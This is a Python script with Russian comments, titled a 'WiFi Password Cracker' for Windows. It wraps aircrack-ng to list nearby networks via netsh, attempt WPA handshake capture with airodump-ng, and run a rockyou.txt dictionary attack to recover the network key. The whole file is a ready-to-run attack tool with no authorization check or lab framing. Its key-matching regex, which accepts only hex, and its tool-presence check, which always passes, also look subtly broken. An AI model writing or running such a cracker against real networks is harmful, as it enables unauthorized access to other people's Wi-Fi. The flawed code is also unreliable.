#!/usr/bin/env python3
"""
WiFi Password Cracker (Windows-адаптация).

Использует aircrack-ng из C:\\aircrack-ng-1.7-win.
На Windows полноценный захват handshake возможен только с AirPcap-адаптером.
Для взлома уже существующего .cap-файла ограничений нет.
"""

import os
import platform
import re
import shutil
import subprocess
import sys

# Путь к сборке aircrack-ng под Windows
AIRCRACK_DIR = r"C:\aircrack-ng-1.7-win"
AIRCRACK_BIN = os.path.join(AIRCRACK_DIR, "bin")

# Кодировка вывода консоли Windows (cp866 для русской локали)
CONSOLE_ENCODING = "cp866"


def _tool(name):
    """Возвращает полный путь к утилите из сборки aircrack-ng."""
    exe = os.path.join(AIRCRACK_BIN, f"{name}.exe")
    if os.path.isfile(exe):
        return exe
    # fallback: ищем в PATH
    found = shutil.which(name)
    return found if found else name


def run_command(cmd):
    """Выполняет команду (список аргументов) и возвращает вывод.

    Декодирует вывод в cp866, чтобы избежать кракозябр в русской локали.
    """
    try:
        result = subprocess.check_output(
            cmd,
            stderr=subprocess.STDOUT,
            text=True,
            encoding=CONSOLE_ENCODING,
            errors="replace",
        )
        return result.strip()
    except FileNotFoundError:
        print(f"Команда не найдена: {cmd[0]}")
        sys.exit(1)
    except subprocess.CalledProcessError as exc:
        print(f"Ошибка при выполнении: {exc.output}")
        sys.exit(1)


def check_windows():
    """Проверяет, что скрипт запущен в Windows."""
    if platform.system() != "Windows":
        print(
            f"Ошибка: этот вариант скрипта предназначен для Windows "
            f"(текущая ОС: {platform.system()})."
        )
        sys.exit(1)


def check_aircrack():
    """Проверяет наличие ключевых утилит aircrack-ng."""
    required = ("airodump-ng", "aircrack-ng")
    missing = [name for name in required if not _tool(name)]
    if missing:
        print(f"Не найдены утилиты: {', '.join(missing)}")
        print(f"Ожидаемый путь: {AIRCRACK_BIN}")
        sys.exit(1)


def get_interfaces():
    """Получает список Wi-Fi интерфейсов через netsh."""
    output = run_command(["netsh", "wlan", "show", "interfaces"])
    interfaces = []
    for line in output.splitlines():
        # Строки вида: "    Name                   : Wi-Fi"
        if "Name" in line and ":" in line:
            name = line.split(":", 1)[1].strip()
            if name:
                interfaces.append(name)
    return interfaces


def get_bssid_list():
    """Показывает видимые сети (SSID + BSSID) через netsh."""
    output = run_command(["netsh", "wlan", "show", "networks", "mode=bssid"])
    return output


def capture_handshake(iface=None, bssid=None, channel=None):
    """
    Пытается запустить airodump-ng для захвата handshake.

    ВАЖНО: в Windows airodump-ng работает только с AirPcap-адаптерами.
    Для обычных Wi-Fi карт этот шаг почти наверняка завершится ошибкой
    или не увидит сети.
    """
    cmd = [_tool("airodump-ng"), "-w", "capture"]

    if bssid and channel:
        cmd += ["-b", bssid, "-c", str(channel)]

    # Если передан интерфейс, добавляем его в конец (airodump-ng <iface>)
    if iface:
        cmd.append(iface)

    print(
        "Предупреждение: в Windows airodump-ng требует AirPcap-совместимый "
        "адаптер. Если у вас обычная Wi-Fi карта, захват не удастся."
    )
    run_command(cmd)
    print("Захват рукопожатия завершен (если адаптер поддерживается)")


def crack_password(capture_file, wordlist=None):
    """
    Запускает aircrack-ng для взлома пароля по словарю.

    Если wordlist не указан, ищет стандартный rockyou.txt в папке сборки.
    """
    if not os.path.isfile(capture_file):
        print(f"Файл не найден: {capture_file}")
        return None

    if wordlist is None:
        candidate = os.path.join(AIRCRACK_DIR, "wordlists", "rockyou.txt")
        if os.path.isfile(candidate):
            wordlist = candidate
        else:
            print(
                "Словарь не указан и rockyou.txt не найден в сборке. "
                "Укажите путь к словарю вручную."
            )
            return None

    cmd = [_tool("aircrack-ng"), "-w", wordlist, capture_file]
    output = run_command(cmd)

    # Вывод aircrack-ng: "KEY FOUND! [ 1234567890ABCDEF ]"
    match = re.search(r"KEY FOUND!\s*\[\s*([0-9A-Fa-f]+)\s*\]", output)
    return match.group(1) if match else None


def main():
    """Точка входа."""
    check_windows()
    check_aircrack()

    print("WiFi Password Cracker (Windows)")
    print("=" * 40)

    interfaces = get_interfaces()
    if not interfaces:
        print("Wi-Fi интерфейсы не найдены (netsh wlan show interfaces).")
        sys.exit(1)

    print(f"Найденные Wi-Fi интерфейсы: {interfaces}")
    iface = interfaces[0]
    print(f"Выбран интерфейс: {iface}")

    print("\nВидимые сети (SSID / BSSID):")
    print(get_bssid_list())

    print("\n--- Захват handshake ---")
    # В Windows лучше пропустить захват, если нет AirPcap,
    # но для полноты оставляем вызов с предупреждением.
    try:
        capture_handshake(iface=iface)
    except SystemExit:
        print("Захват не удался (это ожидаемо для большинства Windows-адаптеров).")

    print("\n--- Взлом пароля ---")
    capture_file = "capture.cap"
    if not os.path.isfile(capture_file):
        print(
            f"Файл {capture_file} не найден. "
            "Если у вас уже есть .cap-файл, положите его в текущую папку "
            "и запустите скрипт снова — взлом работает в Windows без ограничений."
        )
        return

    # При необходимости раскомментируйте и укажите свой словарь:
    # key = crack_password(capture_file, r"C:\path\to\wordlist.txt")
    key = crack_password(capture_file)

    if key:
        print(f"Найден пароль: {key}")
    else:
        print("Пароль не найден (или handshake отсутствует в файле).")


if __name__ == "__main__":
    main()